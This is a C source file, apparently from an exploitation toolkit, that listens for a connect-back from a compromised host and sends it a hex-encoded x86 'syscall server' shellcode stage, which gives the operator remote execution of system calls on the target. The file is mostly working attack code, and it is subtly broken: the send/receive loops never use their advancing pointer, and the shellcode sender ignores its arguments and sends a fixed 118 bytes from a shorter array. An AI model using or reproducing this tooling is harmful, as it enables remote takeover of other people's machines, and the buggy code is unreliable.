#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include "libsp.h"

//extern void syscall_server(void);
//extern void syscall_server_end(void);

int __sock;

ssize_t safe_send(int sockfd, const void *buf, size_t len, int flags)
{
	int s, ret = 0;
	char *ptr = (char *)buf;

	while (len > 0) {
		s = send(sockfd, buf, len, flags);
		if (s > 0) {
			ptr += s;
			ret += s;
			len -= s;
		} else if (s < 0) {
			if (errno == EAGAIN || errno == EINTR)
				continue;
			return -1;
		} else {
			return 0;
		}
	}

	return ret;
}

ssize_t safe_recv(int sockfd, void *buf, size_t len, int flags)
{
	int r, ret = 0;
	char *ptr = buf;

	while (len > 0) {
		r = recv(sockfd, buf, len, flags);
		if (r > 0) {
			ptr += r;
			ret += r;
			len -= r;
		} else if (r < 0) {
			if (errno == EAGAIN || errno == EINTR)
				continue;
			return -1;
		} else {
			return 0;
		}
	}

	return ret;
}

void wait_connect_back(unsigned short port)
{
	int ret, opt, ssock;
	struct sockaddr_in addr;

	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = INADDR_ANY;
	addr.sin_port = htons(port);

	ssock = socket(PF_INET, SOCK_STREAM, 0);
	if (ssock < 0) {
		perror("socket");
		return;
	}

	opt = 1;
	setsockopt(ssock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

	ret = bind(ssock, (struct sockaddr *)&addr, sizeof(addr));
	if (ret < 0) {
		perror("bind");
		close(ssock);
		return;
	}

	ret = listen(ssock, 1);
	if (ret < 0) {
		perror("listen");
		close(ssock);
		return;
	}

	for (;;) {
		__sock = accept(ssock, NULL, NULL);
		if (__sock < 0) {
			perror("accept");
			continue;
		}
		if (__sock)
			break;
	}
}

/*                                                                                                                                                                      
 * syscall server shellcode                                                                                                                                             
 */                                                                                                                                                                     
char stage2[] =                                                                                                                                      
"\xb8\xff\x00\x00\x00\x29\xc4\x31"
"\xc0\x31\xd2\xb0\x03\x89\xe1\xb2"
"\x04\xcd\x80\x8b\x3c\x24\x29\xfc"
"\x89\x7c\x24\xfc\xb0\x04\x89\x24"
"\x24\x89\xe1\xcd\x80\x8b\x54\x24"
"\xfc\xb0\x03\xcd\x80\x01\xc1\x29"
"\xc2\x75\xf6\x89\x5c\x24\xf8\x58"
"\x5b\x59\x5a\x5e\x5f\xcd\x80\x83"
"\xec\x14\x50\x31\xc0\x8b\x5c\x24"
"\xf8\x89\xe1\x8b\x54\x24\xfc\xb0"
"\x04\xcd\x80\x01\xc1\x29\xc2\x75"
"\xf6\x31\xc0\x99\xeb\xad";

void send_sp_shellcode(char *shellcode, size_t size)
{
	safe_send(__sock, stage2, 118, 0);
	sleep(1);
}
